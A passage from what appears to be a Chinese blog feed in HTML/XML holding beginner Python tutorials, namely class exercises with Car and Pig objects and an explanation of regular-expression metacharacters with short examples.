class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出详细属性</span>d2<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h4><h6 id="汽车"><a href="#汽车" class="headerlink" title="汽车"></a>汽车</h6><p>创建一个名为Car的类，其方法<strong>init</strong>() 设置两个属性:name和brand(品牌)。<br>定义一个名为show()的方法，功能是打印出汽车的名称和品牌。<br>定义一个名为run()的方法，打印:汽车XX跑起来了。其中XX表示汽车的name.<br>根据这个类创建一个名为car的实例，先通过属性直接打印其两个属性，再调用上面的两个方法。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: gbk -*-</span><span class="token comment" spellcheck="true"># 创建一个名为Car的对象</span><span class="token keyword">class</span> <span class="token class-name">Car</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 构造__init__方法传值并输出name和brand</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>brand<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>brand <span class="token operator">=</span> brand    <span class="token comment" spellcheck="true"># 构造show方法来输出实例的属性值</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> self<span class="token punctuation">.</span>name        <span class="token keyword">print</span> self<span class="token punctuation">.</span>brand    <span class="token comment" spellcheck="true"># 构造run方法来让汽车跑起来</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'{}跑起来了~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 直接输出实例的属性</span>car <span class="token operator">=</span> Car<span class="token punctuation">(</span><span class="token string">'Evo'</span><span class="token punctuation">,</span><span class="token string">'Mitsubishi'</span><span class="token punctuation">)</span><span class="token keyword">print</span> car<span class="token punctuation">.</span>name<span class="token punctuation">,</span>car<span class="token punctuation">.</span>brand<span class="token comment" spellcheck="true"># 通过上面两个方法输出实例的属性</span>car<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="5辆汽车"><a href="#5辆汽车" class="headerlink" title="5辆汽车"></a>5辆汽车</h6><p>根据在练习1而编写的类创建5个实例，并对每个实例调用show方法。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: gbk -*-</span><span class="token comment" spellcheck="true"># 创建一个名为Car的对象</span><span class="token keyword">class</span> <span class="token class-name">Car</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 构造__init__方法传值并输出name和brand</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>brand<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>brand <span class="token operator">=</span> brand    <span class="token comment" spellcheck="true"># 构造show方法来输出实例的属性值</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> self<span class="token punctuation">.</span>name        <span class="token keyword">print</span> self<span class="token punctuation">.</span>brand    <span class="token comment" spellcheck="true"># 构造run方法来让汽车跑起来</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'{}跑起来了~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建5个实例，并对每个实例调用show方法</span>car1 <span class="token operator">=</span> Car<span class="token punctuation">(</span><span class="token string">'Evo'</span><span class="token punctuation">,</span><span class="token string">'三菱'</span><span class="token punctuation">)</span>car2 <span class="token operator">=</span> Car<span class="token punctuation">(</span><span class="token string">'翼豹'</span><span class="token punctuation">,</span><span class="token string">'斯巴鲁'</span><span class="token punctuation">)</span>car3 <span class="token operator">=</span> Car<span class="token punctuation">(</span><span class="token string">'Type-R'</span><span class="token punctuation">,</span><span class="token string">'丰田'</span><span class="token punctuation">)</span>car4 <span class="token operator">=</span> Car<span class="token punctuation">(</span><span class="token string">'C63'</span><span class="token punctuation">,</span><span class="token string">'奔驰'</span><span class="token punctuation">)</span>car5 <span class="token operator">=</span> Car<span class="token punctuation">(</span><span class="token string">'GT-R'</span><span class="token punctuation">,</span><span class="token string">'日产'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用方法</span>car1<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>car2<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>car3<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>car4<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>car5<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="Pig"><a href="#Pig" class="headerlink" title="Pig"></a>Pig</h6><p>创建一个名为Pig的类，其中包含属性name和weight<br>定义一个名为show()方法，打印Pig的基本信息;<br>再定义一个名为run() 的方法，打印：’XX: 没吃过猪肉，让你看看猪跑！’。<br>创建多个表示不同猪的实例，并对每个实例都调用上述两个方法。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: gbk -*-</span><span class="token comment" spellcheck="true"># 创建Pig类</span><span class="token keyword">class</span> <span class="token class-name">Pig</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 构造__init__方法进行传值</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>weight<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>weight <span class="token operator">=</span> weight    <span class="token comment" spellcheck="true"># 构造show方法打印基本信息</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'你好！我是{}，我{}kg~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>weight<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 构造run方法输出题目要求内容</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'{}：没吃过猪肉，让你看看猪跑~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 实例化多个对象</span>pig1 <span class="token operator">=</span> Pig<span class="token punctuation">(</span><span class="token string">'佩奇'</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">)</span>pig2 <span class="token operator">=</span> Pig<span class="token punctuation">(</span><span class="token string">'乔治'</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># pig1调用两个方法</span>pig1<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>pig1<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># pig2调用两个方法</span>pig2<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>pig2<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="就餐人数"><a href="#就餐人数" class="headerlink" title="就餐人数"></a>就餐人数</h6><p>在为完成练习1的Car类中，添加一个名为number_of_people的属性，并将其默认值设置为0。添加一个名为max_people的属性，表示车上最多可以有几个人。修改相应的构造方法，传入max_people的值。<br>添加一个名为set_people() 的方法，它让你能够设置车上的人数，但是不能超过max_people的限制。<br>添加一个名为increase_people()的方法，每次调用这个方法就会让车上的人数加1，但是不能超过max_people的限制。<br>添加一个名为reduce_people()的方法，每次调用这个方法就会让车上的人数减少1，但是最多减少为0.<br>根据这个类创建一个名为car的实例，先通过属性直接打印其两个属性，再调用上面的两个方法。;打印有多少人在车上，然后多次调用以上3个方法，并打印车上的人数。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: gbk -*-</span><span class="token comment" spellcheck="true"># 创建一个名为Car的对象</span><span class="token keyword">class</span> <span class="token class-name">Car</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 构造__init__方法传值并输出name和brand</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>brand<span class="token punctuation">,</span>max_people<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>brand <span class="token operator">=</span> brand        self<span class="token punctuation">.</span>max_people <span class="token operator">=</span> max_people        self<span class="token punctuation">.</span>number_of_people <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment" spellcheck="true"># 构造show方法来输出实例的属性值</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'{}：当前车内人数为：{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>number_of_people<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 构造run方法来让汽车跑起来</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'{}跑起来了~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 构造set_people方法，设置车内初始人数</span>    <span class="token keyword">def</span> <span class="token function">set_people</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>people<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> people <span class="token operator">&lt;=</span> self<span class="token punctuation">.</span>max_people<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>number_of_people <span class="token operator">=</span> people        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'超载啦！'</span>    <span class="token comment" spellcheck="true"># 构造increase_people方法，每次调用车内人数加一</span>    <span class="token keyword">def</span> <span class="token function">increase_people</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>number_of_people<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;=</span> self<span class="token punctuation">.</span>max_people<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>number_of_people <span class="token operator">=</span> self<span class="token punctuation">.</span>number_of_people<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'超载啦！'</span>    <span class="token comment" spellcheck="true"># 构造reduce_people方法，每次调用车内人数减一</span>    <span class="token keyword">def</span> <span class="token function">reduce_people</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>number_of_people<span class="token number">-1</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>number_of_people <span class="token operator">=</span> self<span class="token punctuation">.</span>number_of_people<span class="token number">-1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'车里已经没人了！'</span><span class="token comment" spellcheck="true"># 实例化对象car    </span>car <span class="token operator">=</span> Car<span class="token punctuation">(</span><span class="token string">'Evo'</span><span class="token punctuation">,</span><span class="token string">'三菱'</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 通过属性实例直接打印出属性name和brand</span><span class="token keyword">print</span> car<span class="token punctuation">.</span>name<span class="token punctuation">,</span>car<span class="token punctuation">.</span>brand<span class="token comment" spellcheck="true"># 调用题目中要求的方法，并输出车内人数</span>car<span class="token punctuation">.</span>increase_people<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>reduce_people<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 按照题目要求，多次调用以上3个方法，并打印车内人数</span>car<span class="token punctuation">.</span>set_people<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>reduce_people<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>increase_people<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>reduce_people<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>reduce_people<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>increase_people<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>reduce_people<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>set_people<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>reduce_people<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>increase_people<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>reduce_people<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>car<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python安全开发篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解Python中的正则表达式</title>
      <link href="/posts/c2789c50.html"/>
      <url>/posts/c2789c50.html</url>
      
        <content type="html"><![CDATA[<h3 id="Python正则表达式"><a href="#Python正则表达式" class="headerlink" title="Python正则表达式"></a>Python正则表达式</h3><ul><li>正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。</li><li>re 模块使 Python 语言拥有全部的正则表达式功能。</li><li>compile 函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。 </li><li>re 模块也提供了与这些方法功能完全一致的函数，这些函数使用一个模式字符串做为它们的第一个参数。</li></ul><h3 id="正则表达式元字符"><a href="#正则表达式元字符" class="headerlink" title="正则表达式元字符"></a>正则表达式元字符</h3><h5 id="（点）"><a href="#（点）" class="headerlink" title=".（点）"></a>.（点）</h5><ul><li>点是匹配除换行符以外的任何单个字符</li></ul><p>例子：</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''苹果，是绿色的橙子，是橙色的草莓，是红色的乌鸦，是黑色的'''</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'.色'</span><span class="token punctuation">)</span><span class="token keyword">for</span> one <span class="token keyword">in</span> p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图形化正则：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625053758466.png" alt="在这里插入图片描述"><br>运行结果（我这里字符编码出了些问题…）：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625052754380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="（方括号）"><a href="#（方括号）" class="headerlink" title="[]（方括号）"></a>[]（方括号）</h5><ul><li><p>常用来指定一个字符集，例如：[abc]或[a-z]</p></li><li><p>元字符在字符集中不起作用，例如：[asd$]</p></li><li><p>补集匹配不在区间范围内的字符，例如：[^5]</p><p>写了这些理论，不如来一个例子体会一下这个[]元字符是什么效果：</p></li></ul><pre class="line-numbers language-py"><code class="language-py">content = '''苹果，是绿色的橙子，是橙色的草莓，是红色的乌鸦，是黑色的'''import rep = re.compile(r'[绿橙红黑]色')for one in p.findall(content):    print(one)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图形化正则：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625053652711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020062506053657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>它还可以这样玩:</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''小李，156888z7894，21小张，18866716789，23小王，13512342233，26小崔，y3552342133，18小刘，g3510348233，35小唐，a3211232243，42'''</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'[a-z]\d{10}'</span><span class="token punctuation">)</span><span class="token keyword">for</span> one <span class="token keyword">in</span> p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图形化正则：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625135833332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625135918427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如果在方括号中使用 ^ ， 表示 非 方括号里面的字符集合，例如：</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token string">'a1b2c3d4e5'</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'[^\d]'</span> <span class="token punctuation">)</span><span class="token keyword">for</span> one <span class="token keyword">in</span>  p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图形化正则：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625140132505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625140155519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="（插入符）"><a href="#（插入符）" class="headerlink" title="^（插入符）"></a>^（插入符）</h5><ul><li>匹配行首，除非设置MULTILINE标志，他只是匹配字符串的开始。</li><li>在MULTILINE模式里，它也可以匹配每个字符串中的换行</li></ul><p>正则表达式可以设定 单行模式 和 多行模式</p><pre><code>如果是 多行模式 ，表示匹配 文本每行 的开头位置。如果是 单行模式 ，表示匹配 整个文本 的开头位置。比如，下面的文本中，每行最前面的数字表示水果的编号，最后的数字表示价格</code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token number">001</span><span class="token operator">-</span>苹果价格<span class="token operator">-</span><span class="token number">60</span>，<span class="token number">002</span><span class="token operator">-</span>橙子价格<span class="token operator">-</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">003</span><span class="token operator">-</span>香蕉价格<span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>例子：</p><pre class="line-numbers language-py"><code class="language-py">content = '''001-苹果价格-60，002-橙子价格-70,003-香蕉价格-80,'''import rep = re.compile(r'^\d+',re.M )for one in  p.findall(content):    print(one)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图形化正则：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625142950227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行结果可以看到，^只匹配行首的所有数字，这里的re.M是指定当前为多行模式：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625143012512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="（dollar符）"><a href="#（dollar符）" class="headerlink" title="$（dollar符）"></a>$（dollar符）</h5><ul><li>效果同^，之不过它匹配的是行尾的字符集</li><li>匹配行尾，要么是一个字符串的行尾，要么是换行符后面的任何位置。</li></ul><p>例子：</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''001-苹果价格-60002-橙子价格-70003-香蕉价格-80'''</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\d+$'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>M <span class="token punctuation">)</span><span class="token keyword">for</span> one <span class="token keyword">in</span>  p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图形化正则：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625143531267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行结果可以看到，它把所有的价格都打印出来了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625143553912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="（反斜杠）"><a href="#（反斜杠）" class="headerlink" title="\（反斜杠）"></a>\（反斜杠）</h5><ul><li>把元字符转换为普通符号的时候用\来转移</li></ul><p>简单点说，就跟输出字符串前加一个r，取消字符串里的转义效果是一样的，上一个例子就明白了：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re                    <span class="token comment" spellcheck="true"># 导入re包</span>a <span class="token operator">=</span> <span class="token string">'tp,top$,toop,top'</span>       <span class="token comment" spellcheck="true"># 定义一个字符串a</span>c <span class="token operator">=</span> r<span class="token string">'top\$'</span>                 <span class="token comment" spellcheck="true"># 这里加了\</span><span class="token keyword">print</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>c<span class="token punctuation">,</span>a<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 用规则c去匹配字符a并输出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img 